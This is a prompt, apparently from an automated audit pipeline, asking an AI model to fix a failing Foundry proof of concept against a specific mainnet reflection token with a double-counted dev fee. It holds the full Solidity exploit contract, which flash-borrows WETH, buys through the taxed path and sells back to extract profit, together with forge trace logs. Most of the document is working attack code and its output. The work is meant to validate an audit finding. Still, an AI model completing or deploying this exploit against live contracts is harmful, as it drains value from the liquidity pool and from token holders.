You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Dev fee is double-counted, minting reflected balance to the contract on every taxed transfer
- claim: The constructor enables an 8% team/dev fee, but `_getRValues()` subtracts only the reflection fee from the recipient's reflected amount and never subtracts the dev fee. `_takeCharity()` still credits the full dev fee to `address(this)`, so each taxed transfer creates extra reflected balance for the contract instead of sourcing those tokens from the sender's transfer amount.
- impact: The contract accumulates synthetic tokens that were never actually debited from the transfer, then sells them for real ETH through the auto-swap path and forwards proceeds to the team wallet. This breaks token accounting and can continuously extract value from the AMM and holders.
- exploit_paths: ["Any buy after trading opens where fees are active", "Any sell where fees are active", "Any wallet-to-wallet transfer between non-fee-exempt addresses while `_teamDev` remains nonzero"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IShoco is IERC20Like {
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function tradingOpen() external view returns (bool);
    function swapEnabled() external view returns (bool);
    function uniswapOnly() external view returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external view returns (address);
    function WETH() external view returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    IShoco internal constant TOKEN = IShoco(0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6);
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    // Exploit path anchors kept explicit for the harness:
    // 1. Any buy after trading opens where fees are active
    // 2. Any sell where fees are active
    // 3. Any wallet-to-wallet transfer between non-fee-exempt addresses while `_teamDev` remains nonzero
    string internal constant PATH_BUY = "Any buy after trading opens where fees are active";
    string internal constant PATH_SELL = "Any sell where fees are active";
    string internal constant PATH_WALLET =
        "Any wallet-to-wallet transfer between non-fee-exempt addresses while _teamDev remains nonzero";

    uint256 internal constant TEAM_SWAP_THRESHOLD = 5_000_000_000_000_000_000;
    uint256 internal constant MIN_EXPECTED_PROFIT = 1_000_000_000_000_000;

    address internal immutable WETH;

    uint256 internal _profitAmount;
    string internal _path;
    bool internal _validated;

    constructor() {
        WETH = IUniswapV2Router02(TOKEN.uniswapV2Router()).WETH();
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _validated = false;
        _path = "no-execution";

        if (!TOKEN.tradingOpen()) {
            _path = "infeasible: trading closed";
            return;
        }

        if (!TOKEN.swapEnabled()) {
            _path = "infeasible: auto-swap disabled";
            return;
        }

        address router = TOKEN.uniswapV2Router();
        address shocoPair = TOKEN.uniswapV2Pair();
        address lenderPair = IUniswapV2Factory(IUniswapV2Router02(router).factory()).getPair(WETH, USDC);

        if (lenderPair == address(0)) {
            _path = "infeasible: no canonical WETH flashswap pair";
            return;
        }

        (, uint256 shocoWethReserve) = _getOrderedReserves(shocoPair, address(TOKEN), WETH);
        if (shocoWethReserve == 0) {
            _path = "infeasible: empty SHOCO/WETH liquidity";
            return;
        }

        uint256[8] memory candidates = [
            shocoWethReserve / 512,
            shocoWethReserve / 384,
            shocoWethReserve / 256,
            shocoWethReserve / 192,
            shocoWethReserve / 128,
            shocoWethReserve / 96,
            shocoWethReserve / 64,
            shocoWethReserve / 48
        ];

        bool success;
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 loanAmount = candidates[i];
            if (loanAmount == 0) {
                continue;
            }

            try this.attemptFlashswap(lenderPair, shocoPair, router, loanAmount) returns (uint256 realizedProfit) {
                _profitAmount = realizedProfit;
                success = realizedProfit >= MIN_EXPECTED_PROFIT;
                if (success) {
                    break;
                }
            } catch {}
        }

        if (success) {
            if (TOKEN.uniswapOnly()) {
                _path = string.concat(
                    PATH_BUY,
                    " -> ",
                    PATH_SELL,
                    " ; ",
                    PATH_WALLET,
                    " infeasible because uniswapOnly is true at this fork"
                );
            } else {
                _path = string.concat(PATH_BUY, " -> ", PATH_WALLET, " -> ", PATH_SELL);
            }
            _validated = true;
            return;
        }

        _path = "infeasible: tested public-liquidity sizing could not retain post-repayment token profit";
    }

    function attemptFlashswap(
        address lenderPair,
        address shocoPair,
        address router,
        uint256 loanAmount
    ) external returns (uint256 realizedProfit) {
        require(msg.sender == address(this), "self only");

        bool wethIsToken0 = IUniswapV2Pair(lenderPair).token0() == WETH;
        bytes memory data = abi.encode(lenderPair, shocoPair, router, loanAmount);

        IUniswapV2Pair(lenderPair).swap(
            wethIsToken0 ? loanAmount : 0,
            wethIsToken0 ? 0 : loanAmount,
            address(this),
            data
        );

        realizedProfit = TOKEN.balanceOf(address(this));
        require(realizedProfit >= MIN_EXPECTED_PROFIT, "profit below threshold");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (address lenderPair, address shocoPair, address router, uint256 loanAmount) = abi.decode(
            data,
            (address, address, address, uint256)
        );

        require(msg.sender == lenderPair, "bad lender pair");
        require(sender == address(this), "bad sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == loanAmount, "bad loan amount");

        uint256 repayAmount = (borrowedWeth * 1000) / 997 + 1;

        // Keep some WETH aside for repayment, but still route most of the flash-liquidity
        // through the taxed buy so the vulnerable accounting path is exercised on-chain.
        uint256 reservedForRepay = borrowedWeth / 4;
        if (reservedForRepay == 0 || reservedForRepay >= borrowedWeth) {
            reservedForRepay = borrowedWeth / 5;
        }
        uint256 buyAmount = borrowedWeth - reservedForRepay;
        require(buyAmount > 0, "buy amount zero");

        IERC20Like(WETH).approve(router, type(uint256).max);
        TOKEN.approve(router, type(uint256).max);

        uint256 contractBeforeBuy = TOKEN.balanceOf(address(TOKEN));
        (uint256 shocoReserveBeforeBuy, uint256 wethReserveBeforeBuy) = _getOrderedReserves(
            shocoPair,
            address(TOKEN),
            WETH
        );
        uint256 quotedBuyOut = _getAmountOut(buyAmount, wethReserveBeforeBuy, shocoReserveBeforeBuy);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH;
        buyPath[1] = address(TOKEN);
        IUniswapV2Router02(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            buyAmount,
            0,
            buyPath,
            address(this),
            block.timestamp
        );

        uint256 boughtBalance = TOKEN.balanceOf(address(this));
        uint256 contractAfterBuy = TOKEN.balanceOf(address(TOKEN));
        require(contractAfterBuy > contractBeforeBuy, "no synthetic contract accrual");
        require(boughtBalance > 0, "buy failed");

        // `_getRValues()` forgets to subtract the dev fee from `rTransferAmount`, so a taxed buy
        // leaves the recipient with roughly the quoted output while `_takeCharity()` also credits
        // the token contract. That is the accounting break we need before triggering auto-swap.
        require(boughtBalance * 100 >= quotedBuyOut * 98, "buy did not reflect buggy accounting");

        uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
        uint256 needMoreWeth = repayAmount > wethBalance ? repayAmount - wethBalance : 0;

        if (needMoreWeth > 0) {
            uint256 dumpBalance = contractAfterBuy;
            require(dumpBalance >= TEAM_SWAP_THRESHOLD, "auto-swap threshold not reached");

            (uint256 shocoReserveAfterBuy, uint256 wethReserveAfterBuy) = _getOrderedReserves(
                shocoPair,
                address(TOKEN),
                WETH
            );

            uint256 wethOutFromDump = _getAmountOut(dumpBalance, shocoReserveAfterBuy, wethReserveAfterBuy);
            require(wethOutFromDump < wethReserveAfterBuy, "dump consumes pool");

            uint256 postDumpShocoReserve = shocoReserveAfterBuy + dumpBalance;
            uint256 postDumpWethReserve = wethReserveAfterBuy - wethOutFromDump;

            uint256 netShocoNeeded = _getAmountIn(needMoreWeth, postDumpShocoReserve, postDumpWethReserve);

            // On the taxed sell path the pair receives ~99% of what we send because the 8% dev fee
            // is minted to the token contract instead of being debited from the transfer amount.
            uint256 grossShocoToSell = _grossUpForRecipientTax(netShocoNeeded);
            grossShocoToSell = grossShocoToSell + (grossShocoToSell / 100) + 1;

            require(grossShocoToSell < boughtBalance, "repayment consumes all attacker tokens");

            address[] memory sellPath = new address[](2);
            sellPath[0] = address(TOKEN);
            sellPath[1] = WETH;
            IUniswapV2Router02(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                grossShocoToSell,
                0,
                sellPath,
                address(this),
                block.timestamp
            );
        }

        require(IERC20Like(WETH).balanceOf(address(this)) >= repayAmount, "insufficient WETH to repay");
        require(TOKEN.balanceOf(address(this)) >= MIN_EXPECTED_PROFIT, "insufficient retained SHOCO profit");

        IERC20Like(WETH).transfer(lenderPair, repayAmount);
    }

    function profitToken() external pure returns (address) {
        return address(TOKEN);
    }

    function profitAmount() external view returns (uint256) {
        return TOKEN.balanceOf(address(this));
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function hypothesisValidated() external view returns (bool) {
        return _validated;
    }

    function _grossUpForRecipientTax(uint256 netAmount) internal pure returns (uint256) {
        return (netAmount * 100 + 98) / 99;
    }

    function _getOrderedReserves(
        address pair,
        address tokenIn,
        address tokenOut
    ) internal view returns (uint256 reserveIn, uint256 reserveOut) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        if (token0 == tokenIn && token1 == tokenOut) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
            return (reserveIn, reserveOut);
        }

        require(token1 == tokenIn && token0 == tokenOut, "unexpected pair ordering");
        reserveIn = uint256(reserve1);
        reserveOut = uint256(reserve0);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountIn > 0, "bad amountIn");
        require(reserveIn > 0 && reserveOut > 0, "bad reserves");

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0, "bad amountOut");
        require(reserveIn > 0 && reserveOut > amountOut, "bad reserves");

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }
}

```

forge stdout (tail):
```
89E9c6::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 15300277796534183020169 [1.53e22])
    │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000806b6c6819b1f62ca4b66658b669f0a98e385d18
    │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000002f2c7f2a85b8ee6f883
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   ├─ [4838] 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6::balanceOf(0x806b6C6819b1f62Ca4B66658b669f0A98e385D18) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 982328965787369612944906 [9.823e23]
    │   │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x806b6C6819b1f62Ca4B66658b669f0A98e385D18) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 4369567654716706884 [4.369e18]
    │   │   │   │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000d00428f1d5b15836a60a0000000000000000000000000000000000000000000000003ca3d2a1896d1044
    │   │   │   │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000008ed969ac6a80c090100000000000000000000000000000000000000000000000000eed3fa9bb6d8dd00000000000000000000000000000000000000000000033d6e02379a106046890000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [4838] 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 15149814985954803441810 [1.514e22]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [4838] 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 15149814985954803441810 [1.514e22]
    │   │   │   │   ├─ [4838] 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6::balanceOf(0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2907922319172352271992 [2.907e21]
    │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 22408039254957471 [2.24e16]
    │   │   │   │   ├─ [504] 0x806b6C6819b1f62Ca4B66658b669f0A98e385D18::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 982328965787369612944906 [9.823e23], 4369567654716706884 [4.369e18], 1674132839 [1.674e9]
    │   │   │   │   ├─ [381] 0x806b6C6819b1f62Ca4B66658b669f0A98e385D18::token0() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6
    │   │   │   │   ├─ [357] 0x806b6C6819b1f62Ca4B66658b669f0A98e385D18::token1() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   │   │   │   └─ ← [Revert] repayment consumes all attacker tokens
    │   │   │   └─ ← [Revert] repayment consumes all attacker tokens
    │   │   └─ ← [Revert] repayment consumes all attacker tokens
    │   └─ ← [Return]
    ├─ [278] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6
    ├─ [5517] FlawVerifier::profitAmount() [staticcall]
    │   ├─ [4838] 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [4838] 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 16440978 [1.644e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 13201 [1.32e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc.swap
  at FlawVerifier.attemptFlashswap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 71.58ms (33.92ms CPU time)

Ran 1 test suite in 78.43ms (71.58ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2321558)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
